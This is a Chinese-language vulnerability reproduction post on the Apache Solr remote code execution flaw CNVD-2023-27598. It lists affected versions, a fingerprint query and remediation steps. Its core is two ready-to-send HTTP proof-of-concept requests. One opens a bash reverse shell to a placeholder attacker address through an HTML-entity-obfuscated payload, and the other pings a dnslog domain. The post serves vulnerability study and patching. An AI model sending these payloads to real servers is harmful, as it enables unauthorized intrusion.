---
title: "Apache Solr 代码执行漏洞 CNVD-2023-27598"
date: 2026-10-14 09:03:39
categories:
  - WebSecurity
  - CVE
  - "中间件"
  - "Apache-Solr"
tags:
  - "Apache-Solr"
  - "命令执行"
  - "代码执行"
  - "CNVD-2023-27598"
  - "漏洞复现"
---
## 漏洞描述

Solr 以 Solrcloud 模式启动且可出网时，未经身份验证的远程攻击者可以通过发送特制的数据包进行利用，最终在目标系统上远程执行任意代码。

## 漏洞影响

```
8.10.0 <= Apache Solr < 9.2.0
```

## 网络测绘

```
app="APACHE-Solr"
```

## 漏洞复现

使用postCommit来命令执行

<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">POST /solr/demo/config HTTP/1.1
Host: 192.168.1.92:8983
Content-Length: 180
Content-Type: application/json

{"add-listener":{"event":"postCommit","name":"suiyi","class":"solr.RunExecutableListener","exe":"bash","dir":"/bin/","args":["-c", "&#98;ash -i &gt;&amp; &#47;dev/tcp/your-ip/9999 0&gt;&amp;1"]}}</code></pre>

</details>

通过newSearcher命令执行

```
POST /solr/demo/config HTTP/1.1
Host: 192.168.1.92:8983
Content-Length: 170
Content-Type: application/json

{"add-listener":{"event":"newSearcher","name":"newSearcher3","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "ping -c 3 your-dnslog.dnslog.cn"]}}
```

## 漏洞修复

1. 如果未使用 ConfigSets API，请禁用 UPLOAD 命令，将系统属性：configset.upload.enabled 设置为 false ，详细参考：https://lucene.apache.org/solr/guide/8_6/configsets-api.html
2. 使用身份验证/授权，详细参考：https://lucene.apache.org/solr/guide/8_6/authentication-and-authorization-plugins.html
3. 官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，酌情升级至安全版本：
   https://github.com/apache/solr/releases/tag/releases/solr/9.2.0

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/middleware/Apache-Solr-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CNVD-2023-27598.md)
